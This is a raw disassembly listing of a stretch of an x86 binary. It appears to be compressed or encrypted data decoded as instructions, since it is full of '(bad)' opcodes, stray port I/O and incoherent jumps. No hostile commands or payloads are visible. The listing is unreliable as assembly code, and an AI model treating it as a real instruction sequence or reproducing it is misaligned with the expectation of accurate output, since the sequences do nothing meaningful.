  4181c1:	and    al,0xaa
  4181c3:	shl    DWORD PTR ds:0xeb5b9192,0x93
  4181ca:	or     al,BYTE PTR ds:0x2cd701f5
  4181d0:	lods   al,BYTE PTR ds:[esi]
  4181d1:	rcr    DWORD PTR [esi],cl
  4181d3:	imul   esp,DWORD PTR [eax-0x28af161e],0xc96e4fa8
  4181dd:	mov    ebx,0xe0711141
  4181e2:	dec    esp
  4181e3:	fst    DWORD PTR [esi+0x66fa043b]
  4181e9:	stos   DWORD PTR es:[edi],eax
  4181ea:	mov    esi,0x661f4f04
  4181ef:	int3   
  4181f0:	clc    
  4181f1:	jo     0x41818c
  4181f3:	fnsave [edi-0x24]
  4181f6:	xchg   esp,eax
  4181f7:	shl    DWORD PTR [ebp+ebx*4+0x44],cl
  4181fb:	dec    edi
  4181fc:	loopne 0x4181a3
  4181fe:	mov    edi,0xe118da36
  418203:	cmp    eax,0xe98c079e
  418208:	shl    BYTE PTR [ebx],1
  41820a:	mov    bh,0x49
  41820c:	scas   eax,DWORD PTR es:[edi]
  41820d:	push   ebx
  41820e:	xor    BYTE PTR [ebp+0x612fda82],bh
  418214:	(bad)  
  418215:	cli    
  418216:	repnz dec ebp
  418218:	in     al,0x99
  41821a:	inc    ebx
  41821b:	test   BYTE PTR [edx+0x6b],bh
  41821e:	retf   0x703e
  418221:	cwde   
  418222:	in     eax,0xc5
  418224:	adc    eax,0xa04b2819
  418229:	std    
  41822a:	inc    ebx
  41822b:	or     cl,BYTE PTR fs:[edx+ebx*2+0x53cea18e]
  418233:	mov    cl,0x4b
  418235:	or     al,BYTE PTR [ecx+0xd]
  418238:	push   edi
  418239:	mov    ebx,0x7f0408f2
  41823e:	lea    eax,[esi]
  418240:	jmp    0xf01f:0xa087b587
  418247:	popa   
  418248:	xchg   edx,eax
  418249:	leave  
  41824a:	jmp    0x4181dc
  41824c:	pop    esp
  41824d:	iret   
  41824e:	int    0x9
  418250:	(bad)  
  418251:	mov    esp,0x82d2f420
  418256:	dec    ebp
  418257:	mov    ebp,0x46a51279
  41825c:	pusha  
  41825d:	in     al,dx
  41825e:	aaa    
  41825f:	cmp    eax,0x3118480b
  418264:	inc    ecx
  418265:	dec    ebx
  418266:	lods   eax,DWORD PTR ds:[esi]
  418267:	daa    
  418268:	jge    0x418229
  41826a:	ins    BYTE PTR es:[edi],dx
  41826b:	out    dx,al
  41826c:	retf   0x71d7
  41826f:	sti    
  418270:	cmc    
  418271:	or     eax,0x4ed3c9fe
  418276:	fimul  DWORD PTR [esi-0x5dea24ad]
  41827c:	in     eax,0x71
  41827e:	sbb    al,0x26
  418280:	sahf   
  418281:	xor    BYTE PTR [ecx+ecx*2],ch
  418284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418285:	sbb    BYTE PTR [edx],0xc0
  418288:	(bad)  
  418289:	jmp    0x41826e
  41828b:	ins    BYTE PTR es:[edi],dx
  41828c:	push   es
  41828d:	iret   
  41828e:	(bad)  
  41828f:	mov    eax,0x81e80248
  418294:	jg     0x41828a
  418296:	ret    
  418297:	leave  
  418298:	lods   eax,DWORD PTR ds:[esi]
  418299:	jne    0x4182cd
  41829b:	dec    ebp
  41829c:	sub    al,0x85
  41829e:	jle    0x418253
  4182a0:	hlt    
  4182a1:	outs   dx,BYTE PTR ds:[esi]
  4182a2:	out    0x96,al
  4182a4:	pop    ss
  4182a5:	fldcw  WORD PTR [ecx+0x7e]
  4182a8:	push   ebp
  4182a9:	pop    edx
  4182aa:	mov    ds:0xaa856d44,al
  4182af:	fs inc ecx
  4182b1:	scas   al,BYTE PTR es:[edi]
  4182b2:	mov    bh,BYTE PTR [ebp-0x92e1037]
  4182b8:	mov    esi,0xe21b5bdd
  4182bd:	dec    eax
  4182be:	in     eax,dx
  4182bf:	pushf  
  4182c0:	scas   eax,DWORD PTR es:[edi]
  4182c1:	test   al,0xbe
  4182c3:	push   esi
  4182c4:	cmp    ecx,DWORD PTR [edi]
  4182c6:	mov    ?,WORD PTR [edx]
  4182c8:	push   eax
  4182c9:	loopne 0x418318
  4182cb:	imul   ebx,DWORD PTR [esi],0x96720db6
  4182d1:	inc    esi
  4182d2:	or     al,0x2c
  4182d4:	jbe    0x41834d
  4182d6:	aam    0x4b
  4182d8:	jmp    0x4182c0
  4182da:	or     eax,esp
  4182dc:	ds sbb al,0x66
  4182df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e0:	add    al,0x5
  4182e2:	leave  
  4182e3:	xor    eax,0xe84a45d
  4182e8:	out    dx,eax
  4182e9:	test   al,0x66
  4182eb:	pop    ecx
  4182ec:	pop    ebp
  4182ed:	mov    edi,0xa230d08e
  4182f2:	mov    esi,0x872e9231
  4182f7:	fimul  DWORD PTR [edx-0x4259c483]
  4182fd:	fisubr WORD PTR [ebx+eiz*4]
  418300:	adc    eax,0xff7ac341
  418305:	mov    bl,0x30
  418307:	jns    0x41833a
  418309:	sub    eax,0xb7526aaa
  41830e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830f:	popf   
  418310:	mov    DWORD PTR ds:0x6ad3a31d,ebp
  418316:	mov    ah,BYTE PTR ds:0x79bf5a3c
  41831c:	dec    edi
  41831d:	adc    edi,DWORD PTR [ebx*4+0x5519f560]
  418324:	fmul   QWORD PTR [ecx-0x3a]
  418327:	or     eax,0x290c2ce9
  41832c:	jl     0x4182da
  41832e:	int3   
  41832f:	jmp    0xb44f3401
  418334:	mov    eax,ds:0x489f39d6
  418339:	mov    esi,0xa9ba9fa5
  41833e:	xor    ebx,DWORD PTR [eax]
  418340:	in     eax,dx
  418341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418342:	dec    esp
  418343:	dec    ebp
  418344:	xor    edi,DWORD PTR [edi+0x714317e2]
  41834a:	fcomp  DWORD PTR [ebp+0x67e5d7a7]
  418350:	jns    0x418363
  418352:	cdq    
  418353:	inc    ebp
  418354:	(bad)
  418357:	lahf   
  418358:	div    DWORD PTR [eax+0x3c0d8995]
  41835e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41835f:	adc    eax,0x3651ca77
  418364:	sub    eax,0x2b4b197e
  418369:	mov    bh,0xdd
  41836b:	jg     0x418334
  41836d:	mov    bh,0x3e
  41836f:	mov    ds:0x9dca1b70,eax
  418374:	outs   dx,BYTE PTR ds:[esi]
  418375:	dec    eax
  418376:	sti    
  418377:	dec    esp
  418378:	xchg   esi,eax
  418379:	call   0x44a61fd9
  41837e:	ret    0x834
  418381:	inc    esi
  418382:	loopne 0x41832c
  418384:	jo     0x418357
  418386:	and    ebx,DWORD PTR [ecx]
  418388:	in     al,dx
  418389:	xor    eax,0xedf0c2df
  41838e:	mov    ch,bh
  418390:	and    esi,ebx
  418392:	add    DWORD PTR [edx+0x2ae4365d],ecx
  418398:	push   0xffffff8d
  41839a:	pop    edx
  41839b:	sbb    bh,ch
  41839d:	xchg   esi,eax
  41839e:	xor    ebx,DWORD PTR [edx]
  4183a0:	mov    eax,0x975e30c6
  4183a5:	xor    BYTE PTR [eax-0x47],bl
  4183a8:	jle    0x418350
  4183aa:	sbb    esp,DWORD PTR [esi-0x4047fbe0]
  4183b0:	stos   DWORD PTR es:[edi],eax
  4183b1:	sub    ebp,ebp
  4183b3:	inc    esp
  4183b4:	jg     0x4183a7
  4183b6:	and    BYTE PTR [ecx+0x7e5aa3ba],ah
  4183bc:	xchg   edx,eax
  4183bd:	jmp    0x358:0x169c3d28
  4183c4:	push   esi
  4183c5:	and    al,BYTE PTR [ebp+edi*4-0x5f023967]
  4183cc:	cmp    BYTE PTR [esi],dh
  4183ce:	(bad)  
  4183cf:	enter  0xbc42,0x4e
  4183d3:	scas   al,BYTE PTR es:[edi]
  4183d4:	mul    DWORD PTR [ebx-0x25d20461]
  4183da:	daa    
  4183db:	enter  0x4315,0xe2
  4183df:	fidivr WORD PTR [esi-0x17606344]
  4183e5:	nop
  4183e6:	repnz mov edi,0x4ec5533c
  4183ec:	adc    BYTE PTR [ecx],al
  4183ee:	fcom   DWORD PTR [esi]
  4183f0:	jb     0x418425
  4183f2:	icebp  
  4183f3:	push   ds
  4183f4:	ins    BYTE PTR es:[edi],dx
  4183f5:	inc    esi
  4183f6:	mov    WORD PTR [ebp+0x56],?
  4183f9:	pop    esi
  4183fa:	sahf   
  4183fb:	out    0x2d,eax
  4183fd:	cmp    eax,0x6dbd4f00
  418402:	jnp    0x41847d
  418404:	repz loopne 0x4183d6
  418407:	jmp    0x99df:0x70babdf3
  41840e:	jnp    0x41839e
  418410:	or     eax,DWORD PTR [esi-0x347f882d]
  418416:	pusha  
  418417:	mov    esi,0x38fe0e27
  41841c:	add    esi,ecx
  41841e:	xlat   BYTE PTR ds:[ebx]
  41841f:	pop    ecx
  418420:	aad    0xab
  418422:	or     DWORD PTR [edx-0x1c9838ae],0x4f
  418429:	mov    ds:0xe0272985,al
  41842e:	lea    ecx,[edi-0x16]
  418431:	dec    ebp
  418432:	jnp    0x41840c
  418434:	push   cs
  418435:	ror    BYTE PTR [ecx+0x2b],cl
  418438:	add    BYTE PTR [esp+ebx*2+0x6c],bl
  41843c:	cmp    dl,BYTE PTR [edx+0x55611076]
  418442:	sub    DWORD PTR [eax],0x19
  418445:	xchg   ebx,eax
  418446:	pop    ebx
  418447:	sbb    al,0x16
  418449:	jmp    0xa4e7203c
  41844e:	sbb    edx,DWORD PTR [edi-0x365385c6]
  418454:	jl     0x4183ed
  418456:	fidivr DWORD PTR [edi+0x7b]
  418459:	out    dx,eax
  41845a:	dec    esi
  41845b:	adc    dh,BYTE PTR [ecx-0x7b]
  41845e:	cmp    al,0x29
  418460:	mov    esp,0x81833f30
  418465:	mov    ds:0xec3423d0,al
  41846a:	inc    edi
  41846b:	lea    esi,[ebx]
  41846d:	pushf  
  41846e:	test   BYTE PTR [ecx],ch
  418470:	fadd   QWORD PTR [ecx+eax*2]
  418474:	pop    ebx
  418475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418476:	imul   ecx,DWORD PTR [edx],0xffffffd2
  418479:	pushf  
  41847a:	ss adc ebx,edx
  41847d:	icebp  
  41847e:	sahf   
  41847f:	lea    esi,[ecx]
  418481:	ins    DWORD PTR es:[edi],dx
  418482:	add    eax,0x4ce17d50
  418487:	les    edi,FWORD PTR [ecx+0x67151233]
  41848d:	fild   DWORD PTR ds:0xd8219660
  418493:	pop    ecx
  418494:	loop   0x418496
	...
  418512:	add    BYTE PTR [eax],al
  418514:	push   edi
  418515:	lea    esp,[ecx+0x7e]
  418518:	sti    
  418519:	(bad)  
  41851a:	pop    edi
  41851b:	lods   eax,DWORD PTR ds:[esi]
  41851c:	into   
  41851d:	fisttp DWORD PTR [edx+0x58]
  418520:	retf   
  418521:	int    0x87
  418523:	mov    ch,0xcb
  418525:	add    DWORD PTR es:[eax],eax
  418528:	imul   eax,DWORD PTR [edi],0x4f150000
  41852e:	push   cs
  41852f:	(bad)  
  418530:	jmp    0x4185a6
  418532:	retf   
  418533:	(bad)  
  418534:	lds    ecx,FWORD PTR [edi]
  418536:	mov    eax,ebx
  418538:	das    
  418539:	inc    ecx
  41853a:	popf   
  41853b:	pop    ebx
  41853c:	inc    esp
  41853d:	push   ebx
  41853e:	addr16 mov bh,0x4d
  418541:	jb     0x4184e3
  418543:	jo     0x4185a3
  418545:	cmp    al,0x37
  418547:	or     BYTE PTR [eax+edx*4-0x49],ch
  41854b:	stos   DWORD PTR es:[edi],eax
  41854c:	xor    DWORD PTR [edx],ebp
  41854e:	push   0xffffffbe
  418550:	mov    es,WORD PTR [esi+esi*4-0x146cfad0]
  418557:	(bad)  
  418559:	adc    al,0x46
  41855b:	movaps xmm1,XMMWORD PTR [ebx]
  41855e:	dec    BYTE PTR [ebx-0x4b3a1df0]
  418564:	mov    eax,0x653314f9
  418569:	sub    cl,BYTE PTR [ecx-0x5c2f4401]
  41856f:	cmc    
  418570:	mov    DWORD PTR [ebp+0x48],eax
  418573:	jne    0x418589
  418575:	jecxz  0x4185c4
  418577:	xchg   dh,bh
  418579:	js     0x4185af
  41857b:	push   ebx
  41857c:	(bad)  
  41857d:	push   eax
  41857e:	mov    dl,0xfd
  418580:	dec    esi
  418581:	pushf  
  418582:	cs sub eax,0x14e12030
  418588:	cmp    ebp,ebx
  41858a:	shl    BYTE PTR [ecx],0xf4
  41858d:	mov    bl,0x4a
  41858f:	ss cld 
  418591:	cdq    
  418592:	cwde   
  418593:	(bad)  
  418594:	mov    ds:0x5f33a789,al
  418599:	lods   al,BYTE PTR ds:[esi]
  41859a:	mov    dl,0xa6
  41859c:	sbb    al,0x0
  41859e:	fisubr DWORD PTR [edi+ecx*2-0x1a]
  4185a2:	call   0xdee39b7
  4185a7:	mov    ebx,ds
  4185a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185aa:	mov    esi,0xc39ec30d
  4185af:	or     BYTE PTR [edx-0x37556b91],dh
  4185b5:	push   ebx
  4185b6:	xor    al,0x7a
  4185b8:	xchg   esp,eax
  4185b9:	daa    
  4185ba:	lahf   
  4185bb:	nop
  4185bc:	rol    esi,0x4b
  4185bf:	aad    0xe7
  4185c1:	js     0x418575
  4185c3:	mov    eax,ds:0x1e7e3394
  4185c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c9:	(bad)  
  4185ca:	out    dx,al
  4185cb:	sbb    al,BYTE PTR [esp+0x2d]
  4185cf:	xor    eax,edx
  4185d1:	bound  edx,QWORD PTR [eax]
  4185d3:	pop    es
  4185d4:	addr16 push es
  4185d6:	mov    bh,0x6e
  4185d8:	push   edx
  4185d9:	cmp    eax,0x7c08a3a4
  4185de:	pop    ebx
  4185df:	stos   BYTE PTR es:[edi],al
  4185e0:	xor    ecx,esi
  4185e2:	(bad)  
  4185e3:	and    DWORD PTR [esi+eiz*4],esi
  4185e6:	fnsave [ecx-0x8bcc7ab]
  4185ec:	imul   ebx,DWORD PTR [edx+0x41],0x74
  4185f0:	xchg   ecx,eax
  4185f1:	mov    ebx,0x974d117d
  4185f6:	cmp    esi,DWORD PTR [ecx]
  4185f8:	scas   eax,DWORD PTR es:[edi]
  4185f9:	iret   
  4185fa:	sub    al,BYTE PTR [ebx+0x71fbd9e7]
  418600:	xchg   esp,eax
  418601:	inc    esi
  418602:	mov    cl,0xa5
  418604:	js     0x418607
  418606:	icebp  
  418607:	cmp    esi,ebx
  418609:	(bad)  
  41860a:	or     al,0xaf
  41860c:	lds    esp,FWORD PTR [esi]
  41860e:	jmp    0x25df9fa3
  418613:	pop    ss
  418614:	push   cs
  418615:	mov    ah,0x58
  418617:	mov    dl,0xaa
  418619:	xchg   ebx,eax
  41861a:	mov    edx,0xcabc2a9c
  41861f:	mov    bl,0x9
  418621:	adc    BYTE PTR [ebx-0xe],0xd1
  418625:	iret   
  418626:	cld    
  418627:	add    dl,BYTE PTR [esi]
  418629:	ins    BYTE PTR es:[edi],dx
  41862a:	cs (bad) 
  41862c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862d:	sti    
  41862e:	or     DWORD PTR [eax+esi*1+0x62],ebp
  418632:	bound  ecx,QWORD PTR [eax+0x23]
  418635:	idiv   ah
  418637:	cli    
  418638:	nop
  418639:	addr16 clc 
  41863b:	mov    ebp,0xaa1358e5
  418640:	loop   0x4186a0
  418642:	out    dx,al
  418643:	xor    DWORD PTR [ecx+0x5ea496fc],ebp
  418649:	in     eax,dx
  41864a:	inc    ecx
  41864b:	jae    0x4186b0
  41864d:	pop    eax
  41864e:	je     0x4185f1
  418650:	fcmovne st,st(4)
  418652:	push   esp
  418653:	(bad)  
  418654:	std    
  418655:	clc    
  418656:	add    DWORD PTR [edx],0xc7e7cc53
  41865c:	xchg   ecx,eax
  41865d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41865e:	cmp    esp,DWORD PTR [ebp+0x54]
  418661:	xlat   BYTE PTR ds:[ebx]
  418662:	mov    eax,ds:0xfc975dac
  418667:	cs nop
  418669:	mov    ebx,0x64ab80c9
  41866e:	push   ebp
  41866f:	cli    
  418670:	fcom   st(7)
  418672:	jl     0x4186bf
  418674:	sbb    al,0xe0
  418676:	xor    esi,eax
  418678:	in     eax,dx
  418679:	ret    0xd611
  41867c:	jle    0x418637
  41867e:	gs jecxz 0x418682
  418681:	enter  0xb20c,0xe2
  418685:	mov    ds:0x850d25e2,al
  41868a:	jns    0x4186b5
  41868c:	(bad)  
  41868d:	test   eax,0xa49a09b
  418692:	ret    
  418693:	xor    al,0x3b
  418695:	mov    esi,0xe9fb6112
  41869a:	lock mov dh,0xa5
  41869d:	sub    esi,DWORD PTR [edi]
  41869f:	mov    al,0xa2
  4186a1:	add    al,0x58
  4186a3:	push   eax
  4186a4:	cmc    
  4186a5:	int3   
  4186a6:	gs loop 0x41864e
  4186a9:	sub    edi,DWORD PTR [esi+esi*4+0xf]
  4186ad:	sbb    DWORD PTR [edx],ebx
  4186af:	in     eax,dx
  4186b0:	ret    0x23c3
  4186b3:	icebp  
  4186b4:	inc    eax
  4186b5:	and    DWORD PTR [ebp+0x1a],0x86608044
  4186bc:	nop
  4186bd:	out    dx,al
  4186be:	cmp    esp,ebx
  4186c0:	pop    es
  4186c1:	es repz (bad) 
  4186c4:	jmp    0x418714
  4186c6:	outs   dx,BYTE PTR fs:[esi]
  4186c8:	das    
  4186c9:	pop    ds
  4186ca:	jecxz  0x4186bf
  4186cc:	(bad)  
  4186cd:	cmp    eax,0x3f0d067c
  4186d2:	loope  0x4186ea
  4186d4:	in     al,dx
  4186d5:	sbb    DWORD PTR [esi-0x18dbb025],ecx
  4186db:	fnsave [ebx+0x42]
  4186de:	sub    al,ah
  4186e0:	mov    BYTE PTR [esi-0x364b39b8],bl
  4186e6:	cmp    BYTE PTR [ebx+0x309b2e1c],bh
  4186ec:	idiv   DWORD PTR [ebx+0x54355e76]
  4186f2:	adc    DWORD PTR [eax+ebx*2+0x67ea1e74],esi
  4186f9:	je     0x41871f
  4186fb:	iret   
  4186fc:	test   al,0xd3
  4186fe:	pop    ebx
  4186ff:	adc    BYTE PTR [esi],bh
  418701:	out    dx,eax
  418702:	jb     0x41877f
  418704:	add    BYTE PTR [eax-0x2f],bh
  418707:	dec    ebx
  418708:	cwde   
  418709:	push   edi
  41870a:	push   es
  41870b:	iret   
  41870c:	(bad)  
  41870d:	adc    bh,ch
  41870f:	adc    DWORD PTR [edi],eax
  418711:	fdiv   DWORD PTR [ebx+0x65bd59a7]
  418717:	push   ecx
  418718:	xor    BYTE PTR [esi],0x7c
  41871b:	xchg   edx,eax
  41871c:	mov    ebp,0xbb9aadd5
  418721:	call   0xe0313bd7
  418726:	test   al,0x50
  418728:	icebp  
  418729:	int    0x6f
  41872b:	(bad)  
  41872c:	icebp  
  41872d:	dec    ecx
  41872e:	push   esi
  41872f:	push   0x4a
  418731:	push   esp
  418732:	mov    ebp,0xb32cbeab
  418737:	imul   ebx,DWORD PTR [edx],0x7e6f9917
  41873d:	popa   
  41873e:	(bad)  
  41873f:	jecxz  0x4187b2
  418741:	push   edi
  418742:	nop
  418743:	push   eax
  418744:	push   cs
  418745:	xor    eax,0xa40d0215
  41874a:	sub    eax,0xc30b2c96
  41874f:	in     eax,0xd0
  418751:	test   eax,0x274c5b5b
  418756:	inc    ebp
  418757:	jno    0x41876d
  418759:	adc    eax,DWORD PTR [edi]
  41875b:	jbe    0x418781
  41875d:	mov    ds:0x8c123c5f,al
  418762:	sub    al,BYTE PTR [edx+0x3e9cdbb9]
  418768:	out    dx,eax
  418769:	sahf   
  41876a:	xlat   BYTE PTR ds:[ebx]
  41876b:	les    esi,FWORD PTR [edi]
  41876d:	xchg   BYTE PTR [ecx-0x1f1f22d],dl
  418773:	imul   esi,DWORD PTR [esi-0x60ead479],0xb06dab8
  41877d:	adc    ebp,DWORD PTR [ebp-0x73]
  418780:	call   0x2786:0x595b0e54
  418787:	mov    al,0x97
  418789:	inc    ecx
  41878a:	adc    al,0xfa
  41878c:	mov    edx,0xa8a3a573
  418791:	repnz sbb ah,BYTE PTR [ebx-0x34017ab9]
  418798:	pop    edi
  418799:	adc    esp,DWORD PTR [edx+0x6530d884]
  41879f:	jmp    0x1672196f
  4187a4:	(bad)  
  4187a6:	cmp    cl,BYTE PTR [esi-0xb9f4d43]
  4187ac:	icebp  
  4187ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ae:	sbb    BYTE PTR [ebx+0x105c07a],bh
  4187b4:	enter  0x5081,0xb4
  4187b8:	mov    DWORD PTR [ebp-0x1df6565a],esp
  4187be:	adc    al,BYTE PTR [edx]
  4187c0:	inc    ebp
  4187c1:	call   0x648c:0x3a7125c7
  4187c8:	das    
  4187c9:	hlt    
  4187ca:	add    ah,ah
  4187cc:	cmp    eax,0x16acfd0a
  4187d1:	(bad)  
  4187d2:	es in  eax,dx
  4187d4:	mov    al,ds:0xd1ca8642
  4187d9:	pop    ss
  4187da:	pop    DWORD PTR [edi]
  4187dc:	jno    0x41884a
  4187de:	xchg   ecx,eax
  4187df:	xchg   bl,dh
  4187e1:	sub    ebx,DWORD PTR [ebp-0x22]
  4187e4:	pop    ss
  4187e5:	or     DWORD PTR [esi+eiz*8-0x63],0x34
  4187ea:	(bad)  
  4187eb:	ins    DWORD PTR es:[edi],dx
  4187ec:	fs out dx,al
  4187ee:	pop    esp
  4187ef:	mov    ecx,0x5cc70159
  4187f4:	mov    ebp,0xe048e9d1
  4187f9:	xor    BYTE PTR [esi+edi*1+0x32df12f1],bh
  418800:	sbb    cl,BYTE PTR [ecx-0x1df25b35]
  418806:	test   DWORD PTR es:[esi],0x99983c48
  41880d:	jae    0x4187a4
  41880f:	pop    esp
  418810:	mov    eax,0xd7377039
  418815:	shl    DWORD PTR [ecx-0x5b],0x1f
  418819:	and    eax,0xb5984e48
  41881e:	in     al,0x7f
  418820:	jae    0x4187e8
  418822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418823:	mov    dh,BYTE PTR [ebx+0x43]
  418826:	dec    esi
  418827:	pop    eax
  418828:	pop    edi
  418829:	push   edi
  41882a:	jbe    0x4187d9
  41882c:	lods   al,BYTE PTR ds:[esi]
  41882d:	add    ah,al
  41882f:	jg     0x418838
  418831:	pop    edx
  418832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418834:	cmp    edx,DWORD PTR [edx+0x78]
  418837:	scas   al,BYTE PTR es:[edi]
  418838:	loope  0x418892
  41883a:	fwait
  41883b:	fs mov ecx,0xa30e177b
  418841:	jmp    0xf57a:0x46db41d2
  418848:	jge    0x41884a
  41884a:	mov    dh,0xb6
  41884c:	adc    ah,BYTE PTR [ebp*2+0x7c6c4b1f]
  418853:	pop    eax
  418854:	enter  0x684c,0x85
  418858:	sbb    BYTE PTR [edx-0x72779d7c],0x3d
  41885f:	xchg   edx,eax
  418860:	sbb    DWORD PTR [ebp-0x5a92118d],esi
  418866:	adc    eax,0xa335ee47
  41886b:	and    BYTE PTR [ecx+0x38536358],bh
  418871:	adc    eax,0x52d61ab6
  418876:	hlt    
  418877:	xchg   esp,eax
  418878:	push   esi
  418879:	stmxcsr DWORD PTR [eax]
  41887c:	jo     0x418872
  41887e:	cmp    eax,0x31d122ca
  418883:	aam    0xab
  418885:	in     eax,dx
  418886:	pop    edx
  418887:	int3   
  418888:	and    edx,DWORD PTR [esi-0x59]
  41888b:	repnz cmp BYTE PTR [edi],ah
  41888e:	mov    BYTE PTR [ebx],0xcb
  418891:	cli    
  418892:	pop    ss
  418893:	xchg   ebp,eax
  418894:	sub    eax,0x68209231
  418899:	jne    0x41887b
  41889b:	inc    ebx
  41889c:	inc    eax
  41889d:	or     BYTE PTR [eax],dl
  41889f:	mov    ebp,0x66028107
  4188a4:	ret    0x8679
  4188a7:	mov    BYTE PTR [edx],0xfd
  4188aa:	or     DWORD PTR [eax-0x32362782],ebx
  4188b0:	push   edx
  4188b1:	sahf   
  4188b2:	mov    ds:0x6819a6a0,al
  4188b7:	xchg   ecx,eax
  4188b8:	retf   
  4188b9:	sbb    ecx,esp
  4188bb:	mov    esp,0x8f2bdaee
  4188c0:	fild   WORD PTR [edx-0xa]
  4188c3:	inc    esi
  4188c4:	test   BYTE PTR [edi+0x5298b222],ah
  4188ca:	mov    eax,0x18625001
  4188cf:	mov    ebp,0xfa0aa438
  4188d4:	hlt    
  4188d5:	add    al,0x16
  4188d7:	mov    ch,BYTE PTR [eax+0xd]
  4188da:	pop    esp
  4188db:	and    ah,BYTE PTR [esi-0x6bd054ac]
  4188e1:	pop    edx
  4188e2:	call   0x21a8ecd8
  4188e7:	inc    ecx
  4188e8:	adc    WORD PTR [esi],ax
  4188eb:	aam    0x70
  4188ed:	rcl    BYTE PTR [ebp+0x7f],1
  4188f0:	enter  0x9eba,0x6d
  4188f4:	xchg   edx,eax
  4188f5:	aaa    
  4188f6:	in     al,0xa3
  4188f8:	(bad)  
  4188fa:	loope  0x41894b
  4188fc:	xchg   esi,eax
  4188fd:	or     ecx,DWORD PTR [edi-0x3d]
  418900:	xor    eax,0x5c586cae
  418905:	mov    dl,0x76
  418907:	or     cl,0x96
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	xchg   ebp,eax
  41890c:	jne    0x41896d
  41890e:	add    eax,0x3b0b3cb2
  418913:	mov    edx,0x1af02b8a
  418918:	int    0x18
  41891a:	ret    0x6b83
  41891d:	stos   DWORD PTR es:[edi],eax
  41891e:	fwait
  41891f:	mov    ebx,0xd28d1e10
  418924:	cwde   
  418925:	jbe    0x4188cd
  418927:	test   al,0xab
  418929:	or     al,dh
  41892b:	scas   eax,DWORD PTR es:[edi]
  41892c:	stos   DWORD PTR es:[edi],eax
  41892d:	lods   eax,DWORD PTR ds:[esi]
  41892e:	ins    DWORD PTR es:[edi],dx
  41892f:	adc    eax,0xacac17fe
  418934:	xor    DWORD PTR [edx-0x11],edx
  418937:	es mov bl,0xae
  41893a:	(bad)  
  41893c:	pop    edx
  41893d:	push   0xffffffe0
  41893f:	retf   0x7328
  418942:	fdecstp 
  418944:	or     DWORD PTR [ecx],eax
  418946:	sahf   
  418947:	cli    
  418948:	es adc ch,bh
  41894b:	arpl   WORD PTR [ebx],si
  41894d:	inc    eax
  41894e:	in     eax,0x50
  418950:	pushf  
  418951:	pop    es
  418952:	mov    edx,0x797ce777
  418957:	jbe    0x418906
  418959:	iret   
  41895a:	(bad)  
  41895c:	mov    ecx,0xcdf655d1
  418961:	xor    eax,DWORD PTR [eax+0xc]
  418964:	lods   al,BYTE PTR ds:[esi]
  418965:	sbb    edx,0xffffffea
  418968:	inc    ecx
  418969:	out    0x72,al
  41896b:	sub    eax,0xa661c1c6
  418970:	nop
  418971:	inc    edi
  418972:	push   edi
  418973:	mov    edi,0xeabc2544
  418978:	mov    esi,0x383e551a
  41897d:	cmp    al,BYTE PTR [edi-0xb]
  418980:	in     eax,0x92
  418982:	std    
  418983:	mov    esp,0x4eaf001c
  418988:	push   esi
  418989:	and    DWORD PTR [eax+0x27],edi
  41898c:	std    
  41898d:	cmp    cl,BYTE PTR [edi-0x7ef5604]
  418993:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418995:	repnz push edx
  418997:	xchg   ebx,eax
  418998:	mov    bh,0xe7
  41899a:	inc    ecx
  41899b:	fcmovnb st,st(6)
  41899d:	ins    DWORD PTR es:[edi],dx
  41899e:	adc    ah,BYTE PTR [ebp+0x1f91a779]
  4189a4:	adc    eax,0xcc87fe20
  4189a9:	xchg   edi,eax
  4189aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189ab:	addr16 retf 
  4189ad:	and    DWORD PTR [ebx+esi*8+0x65b417a6],eax
  4189b4:	xchg   edx,eax
  4189b5:	pushf  
  4189b6:	out    0xdb,eax
  4189b8:	xor    DWORD PTR [edx],ecx
  4189ba:	pop    esp
  4189bb:	lods   eax,DWORD PTR ds:[esi]
  4189bc:	pop    edi
  4189bd:	mov    ch,0x83
  4189bf:	lock push esp
  4189c1:	adc    DWORD PTR [ebx-0x4c],edx
  4189c4:	adc    BYTE PTR [edi+0x77],0x3c
  4189c8:	sub    BYTE PTR [ebp+0x18],bl
  4189cb:	push   edx
  4189cc:	loopne 0x4189f1
  4189ce:	jnp    0x418996
  4189d0:	outs   dx,BYTE PTR ds:[esi]
  4189d1:	fs push esp
  4189d3:	inc    ecx
  4189d4:	push   esp
  4189d5:	cmp    DWORD PTR [edi],ebp
  4189d7:	fwait
  4189d8:	or     al,0xc3
  4189da:	sbb    ch,cl
  4189dc:	push   eax
  4189dd:	hlt    
  4189de:	dec    edx
  4189df:	mov    bh,0x42
  4189e1:	popf   
  4189e2:	jecxz  0x418965
  4189e4:	into   
  4189e5:	(bad)  
  4189e6:	inc    ebx
  4189e7:	dec    ebp
  4189e8:	int3   
  4189e9:	ds in  al,0x40
  4189ec:	and    edx,ebx
  4189ee:	mov    dl,bh
  4189f0:	(bad)  
  4189f1:	and    dh,BYTE PTR [ecx+eax*2-0x47]
  4189f5:	shl    DWORD PTR [edx],1
  4189f7:	mov    ah,bl
  4189f9:	mov    ds:0xcd1a076f,al
  4189fe:	stc    
  4189ff:	mov    eax,ds:0x26084647
  418a04:	icebp  
  418a05:	mov    DWORD PTR [eax+0x3f],0x88fc7368
  418a0c:	sub    BYTE PTR [esi+ecx*4-0x50],0x71
  418a11:	test   BYTE PTR [ebx],dh
  418a13:	jecxz  0x418a83
  418a15:	ficom  DWORD PTR [ebp+0x5f]
  418a18:	sub    DWORD PTR [edi+edi*4+0x6d9f680e],0x6c
  418a20:	(bad)  
